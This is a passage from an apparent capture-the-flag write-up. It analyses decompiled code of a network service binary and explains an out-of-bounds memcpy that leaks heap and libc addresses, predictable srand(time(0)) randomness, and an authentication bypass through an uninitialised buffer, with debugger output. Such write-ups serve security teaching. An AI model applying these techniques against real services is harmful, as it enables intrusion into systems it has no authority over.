</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( opcode <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x101</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      generate_str(a1);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( opcode <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x201</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      authenticate(a1, a2);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>LABEL_9:
</span></span><span style="display:flex;"><span>      memset(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x200uLL</span>);
</span></span><span style="display:flex;"><span>      strcpy(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#e6db74">&#34;unknown opcode</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>      v3 <span style="color:#f92672">=</span> strlen(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>]);
</span></span><span style="display:flex;"><span>      send_to(a1, (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], v3);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>There are 3 op_code <code>[0x301, 0x101, 0x201]</code>. I will talk about those opcodes in turn.</p>
<p><code>0x301 opcode</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">print_data</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">sockaddr</span> <span style="color:#f92672">*</span>a1, data <span style="color:#f92672">*</span>a2)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> s[<span style="color:#ae81ff">2</span>]; <span style="color:#75715e">// [rsp+10h] [rbp-1020h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int16</span> size; <span style="color:#75715e">// [rsp+18h] [rbp-1018h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  _BYTE v5[<span style="color:#ae81ff">6</span>]; <span style="color:#75715e">// [rsp+1Ah] [rbp-1016h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v6; <span style="color:#75715e">// [rsp+1028h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v6 <span style="color:#f92672">=</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>  memset(s, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x100CuLL</span>);
</span></span><span style="display:flex;"><span>  s[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> a2<span style="color:#f92672">-&gt;</span>magic;
</span></span><span style="display:flex;"><span>  s[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> a2<span style="color:#f92672">-&gt;</span>opcode;
</span></span><span style="display:flex;"><span>  memcpy(v5, a2<span style="color:#f92672">-&gt;</span>mess, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int16</span>)a2<span style="color:#f92672">-&gt;</span>size);
</span></span><span style="display:flex;"><span>  size <span style="color:#f92672">=</span> a2<span style="color:#f92672">-&gt;</span>size;
</span></span><span style="display:flex;"><span>  memset(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x200uLL</span>);
</span></span><span style="display:flex;"><span>  memcpy(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], s, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int16</span>)a2<span style="color:#f92672">-&gt;</span>size <span style="color:#f92672">+</span> <span style="color:#ae81ff">10</span>);
</span></span><span style="display:flex;"><span>  send_to(a1, (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int16</span>)a2<span style="color:#f92672">-&gt;</span>size <span style="color:#f92672">+</span> <span style="color:#ae81ff">10</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> v6 <span style="color:#f92672">-</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>It simply sends the data that the user has been sending to the user. Does it safely?</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>addr <span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">sockaddr</span> <span style="color:#f92672">*</span>)malloc(<span style="color:#ae81ff">532uLL</span>);
</span></span><span style="display:flex;"><span>v8 <span style="color:#f92672">=</span> (data <span style="color:#f92672">*</span>)malloc(<span style="color:#ae81ff">0x100CuLL</span>);
</span></span></code></pre></div><p>After examining the variable <code>sockaddr *a1</code>, which has a data field of 0x200 bytes, and the array <code>data *a2</code>, which has 0x1000C bytes of data, we noticed&hellip;</p>
<pre tabindex="0"><code>memcpy(&amp;a1[1].sa_data[2], s, (unsigned __int16)a2-&gt;size + 10);
</code></pre><p>When it uses memcpy to copy <code>s</code> to <code>&amp;a1[1].sa_data[2]</code> with a size larger than 0x200 because <code>a2</code> is below <code>a1</code> struct in the heap mapping address, it causes a message of <code>v5</code> overflow in the metadata field (magic, opcode, size) of <code>a2</code>, so I have the OOB bug.</p>
<pre tabindex="0"><code>pwndbg&gt; tel 100
00:0000│ rsp 0x7ffc4d8e0b30 —▸ 0x5584a5b415e0 ◂— 0x4141414141414141 (&#39;AAAAAAAA&#39;) // a2
01:0008│     0x7ffc4d8e0b38 —▸ 0x5584a5b413c0 ◂— 0x100007faf910002               // a1
02:0010│     0x7ffc4d8e0b40 ◂— 0x30170303070
03:0018│     0x7ffc4d8e0b48 ◂— 0x4141414141410fff
04:0020│     0x7ffc4d8e0b50 ◂— 0x4141414141414141 (&#39;AAAAAAAA&#39;)
... ↓        95 skipped
pwndbg&gt;
</code></pre><p>After repeatedly using the send_to loop to leak the size of 0x1000, it printed multiple data from the heap, including libc and heap addresses.</p>
<pre tabindex="0"><code>► 0x56244a4b4a17    call   sendto@plt                &lt;sendto@plt&gt;
        fd: 0xb (socket:[133812])
        buf: 0x56244bdc63d4 ◂— 0x30170303070
        n: 0x1000
        flags: 0x0
        addr: 0x56244bdc63c0 ◂— 0x100007f1ad40002
        addr_len: 0x10
 
   0x56244a4b4a1c    cmp    rax, -1
   0x56244a4b4a20    jne    0x56244a4b4a31                &lt;0x56244a4b4a31&gt;
 
   0x56244a4b4a22    lea    rax, [rip + 0x15fb]
   0x56244a4b4a29    mov    rdi, rax
   0x56244a4b4a2c    call   error                &lt;error&gt;
────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffd3980e4b0 ◂— 0x4
01:0008│     0x7ffd3980e4b8 ◂— 0x414b00000001
02:0010│     0x7ffd3980e4c0 —▸ 0x56244bdc63d4 ◂— 0x30170303070
03:0018│     0x7ffd3980e4c8 —▸ 0x56244bdc63c0 ◂— 0x100007f1ad40002
04:0020│     0x7ffd3980e4d0 ◂— 0x2158f0
05:0028│     0x7ffd3980e4d8 ◂— 0x100000000000
06:0030│ rbp 0x7ffd3980e4e0 —▸ 0x7ffd3980f520 —▸ 0x7ffd3980f540 —▸ 0x7ffd3980f640 ◂— 0x1
07:0038│     0x7ffd3980e4e8 —▸ 0x56244a4b5101 ◂— nop 
──────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────
 ► 0   0x56244a4b4a17
   1   0x56244a4b5101
   2   0x56244a4b56ff
   3   0x56244a4b5b78
   4   0x7fc435a29d90 __libc_start_call_main+128
   5   0x7fc435a29e40 __libc_start_main_impl+128
   6   0x56244a4b45e5
──────────────────────────────────────────────────────────────────────────────────[ THREADS (3 TOTAL) ]──────────────────────────────────────────────────────────────────────────────────
  ► 1   &#34;serendipity_pat&#34; stopped: 0x56244a4b4a17
    2   &#34;serendipity_pat&#34; stopped: 0x7fc435ae57f8 &lt;clock_nanosleep@GLIBC_2.2.5+200&gt; 
    3   &#34;serendipity_pat&#34; stopped: 0x7fc435b14a0c &lt;read+76&gt; 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg&gt;
</code></pre><p>But, on the server, due to the I/O handle or somehow, I couldn&rsquo;t manage to trigger that bug to leak any address. So we should find another way to leak</p>
<p><code>opcode 0x101</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">generate_str</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">sockaddr</span> <span style="color:#f92672">*</span>a1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">__int64</span> v1; <span style="color:#75715e">// rdx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v2; <span style="color:#75715e">// rdx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> v3; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v5; <span style="color:#75715e">// [rsp+14h] [rbp-ACh]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>rand; <span style="color:#75715e">// [rsp+18h] [rbp-A8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>v7; <span style="color:#75715e">// [rsp+20h] [rbp-A0h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>v8; <span style="color:#75715e">// [rsp+28h] [rbp-98h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> s[<span style="color:#ae81ff">136</span>]; <span style="color:#75715e">// [rsp+30h] [rbp-90h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v10; <span style="color:#75715e">// [rsp+B8h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v10 <span style="color:#f92672">=</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>  rand <span style="color:#f92672">=</span> generate_rand(<span style="color:#ae81ff">32</span>);
</span></span><span style="display:flex;"><span>  v1 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)rand <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)s1 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)rand;
</span></span><span style="display:flex;"><span>  qword_6148 <span style="color:#f92672">=</span> v1;
</span></span><span style="display:flex;"><span>  v2 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)rand <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span>);
</span></span><span style="display:flex;"><span>  qword_6150 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)rand <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>);
</span></span><span style="display:flex;"><span>  qword_6158 <span style="color:#f92672">=</span> v2;
</span></span><span style="display:flex;"><span>  v7 <span style="color:#f92672">=</span> calloc(<span style="color:#ae81ff">1uLL</span>, <span style="color:#ae81ff">0x10uLL</span>);
</span></span><span style="display:flex;"><span>  v8 <span style="color:#f92672">=</span> calloc(<span style="color:#ae81ff">1uLL</span>, <span style="color:#ae81ff">0x10uLL</span>);
</span></span><span style="display:flex;"><span>  memset(s, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x80uLL</span>);
</span></span><span style="display:flex;"><span>  key_iv((<span style="color:#66d9ef">__int64</span>)v7, (<span style="color:#66d9ef">__int64</span>)v8);
</span></span><span style="display:flex;"><span>  v3 <span style="color:#f92672">=</span> strlen(rand);
</span></span><span style="display:flex;"><span>  v5 <span style="color:#f92672">=</span> encrypt((<span style="color:#66d9ef">__int64</span>)s1, v3, (<span style="color:#66d9ef">__int64</span>)v7, (<span style="color:#66d9ef">__int64</span>)v8, (<span style="color:#66d9ef">__int64</span>)s);
</span></span><span style="display:flex;"><span>  send_to(a1, (<span style="color:#66d9ef">__int64</span>)s, v5);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> v10 <span style="color:#f92672">-</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This code generates an array of 32 random bytes using <code>srand(time(0))</code>, making it predictable</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>_BYTE <span style="color:#f92672">*</span><span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">sub_293B</span>(<span style="color:#66d9ef">int</span> a1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> v1; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> i; <span style="color:#75715e">// [rsp+14h] [rbp-Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  _BYTE <span style="color:#f92672">*</span>v4; <span style="color:#75715e">// [rsp+18h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v1 <span style="color:#f92672">=</span> time(<span style="color:#ae81ff">0LL</span>);
</span></span><span style="display:flex;"><span>  srand(v1);
</span></span><span style="display:flex;"><span>  v4 <span style="color:#f92672">=</span> calloc(<span style="color:#ae81ff">1uLL</span>, a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> a1; <span style="color:#f92672">++</span>i )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>      v4[i] <span style="color:#f92672">=</span> rand();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> ( <span style="color:#f92672">!</span>v4[i] );
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> v4;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Continue, it copies the KEY and IV from the file <code>user_config</code> to encrypt with previous random data.</p>
<p><code>opcode 0x201</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">authenticate</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">sockaddr</span> <span style="color:#f92672">*</span>a1, data <span style="color:#f92672">*</span>a2)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> v2; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v3; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v4; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> i; <span style="color:#75715e">// [rsp+14h] [rbp-Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>strncmp(s1, (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)a2<span style="color:#f92672">-&gt;</span>mess, <span style="color:#ae81ff">32uLL</span>) )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    memset(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x200uLL</span>);
</span></span><span style="display:flex;"><span>    strcpy(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#e6db74">&#34;auth successfully</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    v3 <span style="color:#f92672">=</span> strlen(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>]);
</span></span><span style="display:flex;"><span>    send_to(a1, (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], v3);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">3</span>; <span style="color:#f92672">++</span>i )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!*</span>((_QWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>thread_id <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> i) )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>thread_id <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> i) <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)generate_rand(<span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">thread</span>[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> i] <span style="color:#f92672">=</span> time(<span style="color:#ae81ff">0LL</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">60</span>;
</span></span><span style="display:flex;"><span>        memset(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x200uLL</span>);
</span></span><span style="display:flex;"><span>        strncpy(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>thread_id <span style="color:#f92672">+</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">*</span> i, <span style="color:#ae81ff">8uLL</span>);
</span></span><span style="display:flex;"><span>        send_to(a1, (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span>        create_new_thread((<span style="color:#66d9ef">__int64</span>)a1, (<span style="color:#66d9ef">__int64</span>)a2, i);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    memset(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x200uLL</span>);
</span></span><span style="display:flex;"><span>    strcpy(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#e6db74">&#34;only 4 sessions at a time</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    v4 <span style="color:#f92672">=</span> strlen(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>]);
</span></span><span style="display:flex;"><span>    send_to(a1, (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], v4);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    memset(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x200uLL</span>);
</span></span><span style="display:flex;"><span>    strcpy(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#e6db74">&#34;auth failed</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    v2 <span style="color:#f92672">=</span> strlen(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>]);
</span></span><span style="display:flex;"><span>    send_to(a1, (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], v2);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>It compares the encrypted data from the <code>opcode 0x101</code> function with the global variable <code>s1</code>.</p>
<p>I can use the trick I learned from the first challenge to predict the data, but it&rsquo;s not necessary because <code>s1</code> is initialized when I use <code>opcode 0x101</code>. So basically, if I don&rsquo;t initialize it, the <code>s1</code> variable remains uninitialized and I can bypass it with a <code>NULL</code> byte.</p>
<p>If the authentication process is successful, a session ID is generated and stored in the global variable <code>thread_id</code>. It is then sent to the user. Following this, a new thread is created using the <code>start_routine()</code> function with the struct address and data passed in as two arguments for the thread.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">create_new_thread</span>(<span style="color:#66d9ef">__int64</span> a1, <span style="color:#66d9ef">__int64</span> a2, <span style="color:#66d9ef">int</span> a3)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  _DWORD <span style="color:#f92672">*</span>arg; <span style="color:#75715e">// [rsp+28h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  arg <span style="color:#f92672">=</span> calloc(<span style="color:#ae81ff">1uLL</span>, <span style="color:#ae81ff">0x10uLL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)arg <span style="color:#f92672">=</span> a1;
</span></span><span style="display:flex;"><span>  arg[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> a3;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> pthread_create(<span style="color:#f92672">&amp;</span>qword_60E0[a3], <span style="color:#ae81ff">0LL</span>, (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>(<span style="color:#f92672">*</span>)(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>))start_routine, arg);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>start_routine</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">start_routine</span>(_DWORD <span style="color:#f92672">*</span>a1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> v1; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v3; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  size_t v4; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v5; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v6; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v7; <span style="color:#75715e">// [rsp+1Ch] [rbp-344h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">sockaddr</span> <span style="color:#f92672">*</span>v8; <span style="color:#75715e">// [rsp+20h] [rbp-340h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  read_file <span style="color:#f92672">*</span>buf; <span style="color:#75715e">// [rsp+28h] [rbp-338h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  FILE <span style="color:#f92672">*</span>stream; <span style="color:#75715e">// [rsp+30h] [rbp-330h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> s; <span style="color:#75715e">// [rsp+40h] [rbp-320h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> type; <span style="color:#75715e">// [rsp+48h] [rbp-318h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int16</span> size; <span style="color:#75715e">// [rsp+4Ch] [rbp-314h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  _BYTE v14[<span style="color:#ae81ff">258</span>]; <span style="color:#75715e">// [rsp+4Eh] [rbp-312h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> dest[<span style="color:#ae81ff">8</span>]; <span style="color:#75715e">// [rsp+150h] [rbp-210h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v16; <span style="color:#75715e">// [rsp+158h] [rbp-208h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> ptr[<span style="color:#ae81ff">264</span>]; <span style="color:#75715e">// [rsp+250h] [rbp-110h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v18; <span style="color:#75715e">// [rsp+358h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
